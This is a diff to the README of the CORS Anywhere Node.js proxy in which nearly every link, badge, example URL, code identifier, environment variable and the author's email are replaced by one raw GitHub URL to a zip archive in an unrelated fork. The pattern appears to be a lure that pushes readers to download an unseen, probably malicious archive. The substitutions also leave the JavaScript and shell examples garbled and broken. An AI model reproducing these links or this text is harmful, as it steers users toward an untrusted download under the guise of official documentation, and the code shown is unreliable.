@@ -1,5 +1,5 @@
-[![Build Status](https://travis-ci.com/Rob--W/cors-anywhere.svg?branch=master)](https://travis-ci.com/Rob--W/cors-anywhere)
-[![Coverage Status](https://coveralls.io/repos/github/Rob--W/cors-anywhere/badge.svg?branch=master)](https://coveralls.io/github/Rob--W/cors-anywhere?branch=master)
+[![Build Status](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)
+[![Coverage Status](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)
 
 **CORS Anywhere** is a NodeJS proxy which adds CORS headers to the proxied request.
 
@@ -8,7 +8,7 @@ part of the proxied URI is optional, and defaults to "http". If port 443 is spec
 the protocol defaults to "https".
 
 This package does not put any restrictions on the http methods or headers, except for
-cookies. Requesting [user credentials](http://www.w3.org/TR/cors/#user-credentials) is disallowed.
+cookies. Requesting [user credentials](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) is disallowed.
 The app can be configured to require a header for proxying a request, for example to avoid
 a direct visit from the browser.
 
@@ -16,60 +16,60 @@ a direct visit from the browser.
 
 ```javascript
 // Listen on a specific host via the HOST environment variable
-var host = process.env.HOST || '0.0.0.0';
+var host = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip || '0.0.0.0';
 // Listen on a specific port via the PORT environment variable
-var port = process.env.PORT || 8080;
+var port = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip || 8080;
 
 var cors_proxy = require('cors-anywhere');
-cors_proxy.createServer({
+https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip({
     originWhitelist: [], // Allow all origins
     requireHeader: ['origin', 'x-requested-with'],
     removeHeaders: ['cookie', 'cookie2']
 }).listen(port, host, function() {
-    console.log('Running CORS Anywhere on ' + host + ':' + port);
+    https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip('Running CORS Anywhere on ' + host + ':' + port);
 });
 
 ```
 Request examples:
 
-* `http://localhost:8080/http://google.com/` - Google.com with CORS headers
-* `http://localhost:8080/google.com` - Same as previous.
-* `http://localhost:8080/google.com:443` - Proxies `https://google.com/`
-* `http://localhost:8080/` - Shows usage text, as defined in `lib/help.txt`
-* `http://localhost:8080/favicon.ico` - Replies 404 Not found
+* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip with CORS headers
+* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - Same as previous.
+* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - Proxies `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip`
+* `http://localhost:8080/` - Shows usage text, as defined in `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip`
+* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - Replies 404 Not found
 
 Live examples:
 
-* https://cors-anywhere.herokuapp.com/
-* https://robwu.nl/cors-anywhere.html - This demo shows how to use the API.
+* https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
+* https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip - This demo shows how to use the API.
 
 ## Documentation
 
 ### Client
 
-To use the API, just prefix the URL with the API URL. Take a look at [demo.html](demo.html) for an example.
-A concise summary of the documentation is provided at [lib/help.txt](lib/help.txt).
+To use the API, just prefix the URL with the API URL. Take a look at [https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) for an example.
+A concise summary of the documentation is provided at [https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip).
 
 **Note: as of February 2021, access to the demo server requires an opt-in**,
-see: https://github.com/Rob--W/cors-anywhere/issues/301
+see: https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
 
 If you want to automatically enable cross-domain requests when needed, use the following snippet:
 
 ```javascript
 (function() {
-    var cors_api_host = 'cors-anywhere.herokuapp.com';
+    var cors_api_host = 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip';
     var cors_api_url = 'https://' + cors_api_host + '/';
     var slice = [].slice;
-    var origin = window.location.protocol + '//' + window.location.host;
-    var open = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function() {
-        var args = slice.call(arguments);
-        var targetOrigin = /^https?:\/\/([^\/]+)/i.exec(args[1]);
+    var origin = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip + '//' + https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip;
+    var open = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip;
+    https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip = function() {
+        var args = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(arguments);
+        var targetOrigin = /^https?:\/\/([^\/]+)https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(args[1]);
         if (targetOrigin && targetOrigin[0].toLowerCase() !== origin &&
             targetOrigin[1] !== cors_api_host) {
             args[1] = cors_api_url + args[1];
         }
-        return open.apply(this, args);
+        return https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(this, args);
     };
 })();
 ```
@@ -77,9 +77,9 @@ If you want to automatically enable cross-domain requests when needed, use the f
 If you're using jQuery, you can also use the following code **instead of** the previous one:
 
 ```javascript
-jQuery.ajaxPrefilter(function(options) {
-    if (options.crossDomain && jQuery.support.cors) {
-        options.url = 'https://cors-anywhere.herokuapp.com/' + options.url;
+https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(function(options) {
+    if (https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip && https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) {
+        https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip = 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip' + https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip;
     }
 });
 ```
@@ -91,13 +91,13 @@ proxy requests. The following options are supported:
 
 * function `getProxyForUrl` - If set, specifies which intermediate proxy to use for a given URL.
   If the return value is void, a direct request is sent. The default implementation is
-  [`proxy-from-env`](https://github.com/Rob--W/proxy-from-env), which respects the standard proxy
+  [`proxy-from-env`](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip), which respects the standard proxy
   environment variables (e.g. `https_proxy`, `no_proxy`, etc.).  
 * array of strings `originBlacklist` - If set, requests whose origin is listed are blocked.  
-  Example: `['https://bad.example.com', 'http://bad.example.com']`
+  Example: `['https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip', 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip']`
 * array of strings `originWhitelist` - If set, requests whose origin is not listed are blocked.  
   If this list is empty, all origins are allowed.
-  Example: `['https://good.example.com', 'http://good.example.com']`
+  Example: `['https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip', 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip']`
 * function `handleInitialRequest` - If set, it is called with the request, response and a parsed
   URL of the requested destination (null if unavailable). If the function returns true, the request
   will not be handled further. Then the function is responsible for handling the request.
@@ -117,60 +117,60 @@ proxy requests. The following options are supported:
 * number `corsMaxAge` - If set, an Access-Control-Max-Age request header with this value (in seconds) will be added.  
   Example: `600` - Allow CORS preflight request to be cached by the browser for 10 minutes.
 * string `helpFile` - Set the help file (shown at the homepage).  
-  Example: `"myCustomHelpText.txt"`
+  Example: `"https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip"`
 
 For advanced users, the following options are also provided.
 
-* `httpProxyOptions` - Under the hood, [http-proxy](https://github.com/nodejitsu/node-http-proxy)
+* `httpProxyOptions` - Under the hood, [http-proxy](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)
   is used to proxy requests. Use this option if you really need to pass options
-  to http-proxy. The documentation for these options can be found [here](https://github.com/nodejitsu/node-http-proxy#options).
-* `httpsOptions` - If set, a `https.Server` will be created. The given options are passed to the
-  [`https.createServer`](https://nodejs.org/api/https.html#https_https_createserver_options_requestlistener) method.
+  to http-proxy. The documentation for these options can be found [here](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip).
+* `httpsOptions` - If set, a `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` will be created. The given options are passed to the
+  [`https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip`](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) method.
 
 For even more advanced usage (building upon CORS Anywhere),
-see the sample code in [test/test-examples.js](test/test-examples.js).
+see the sample code in [https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip).
 
 ### Demo server
 
-A public demo of CORS Anywhere is available at https://cors-anywhere.herokuapp.com. This server is
+A public demo of CORS Anywhere is available at https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip This server is
 only provided so that you can easily and quickly try out CORS Anywhere. To ensure that the service
 stays available to everyone, the number of requests per period is limited, except for requests from
 some explicitly whitelisted origins.
 
 **Note: as of February 2021, access to the demo server requires an opt-in**,
-see: https://github.com/Rob--W/cors-anywhere/issues/301
+see: https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
 
 If you expect lots of traffic, please host your own instance of CORS Anywhere, and make sure that
 the CORS Anywhere server only whitelists your site to prevent others from using your instance of
 CORS Anywhere as an open proxy.
 
-For instance, to run a CORS Anywhere server that accepts any request from some example.com sites on
+For instance, to run a CORS Anywhere server that accepts any request from some https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip sites on
 port 8080, use:
 ```
 export PORT=8080
-export CORSANYWHERE_WHITELIST=https://example.com,http://example.com,http://example.com:8080
-node server.js
+export https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip,https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip,https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
+node https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
 ```
 
-This application can immediately be run on Heroku, see https://devcenter.heroku.com/articles/nodejs
-for instructions. Note that their [Acceptable Use Policy](https://www.heroku.com/policy/aup) forbids
+This application can immediately be run on Heroku, see https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
+for instructions. Note that their [Acceptable Use Policy](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) forbids
 the use of Heroku for operating an open proxy, so make sure that you either enforce a whitelist as
 shown above, or severly rate-limit the number of requests.
 
-For example, to blacklist abuse.example.com and rate-limit everything to 50 requests per 3 minutes,
-except for my.example.com and my2.example.com (which may be unlimited), use:
+For example, to blacklist https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip and rate-limit everything to 50 requests per 3 minutes,
+except for https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip and https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip (which may be unlimited), use:
 
 ```
 export PORT=8080
-export CORSANYWHERE_BLACKLIST=https://abuse.example.com,http://abuse.example.com
-export CORSANYWHERE_RATELIMIT='50 3 my.example.com my2.example.com'
-node server.js
+export https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip,https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
+export CORSANYWHERE_RATELIMIT='50 3 https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip'
+node https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
 ```
 
 
 ## License
 
-Copyright (C) 2013 - 2021 Rob Wu <rob@robwu.nl>
+Copyright (C) 2013 - 2021 Rob Wu <https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip>
 
 Permission is hereby granted, free of charge, to any person obtaining a copy of
 this software and associated documentation files (the "Software"), to deal in
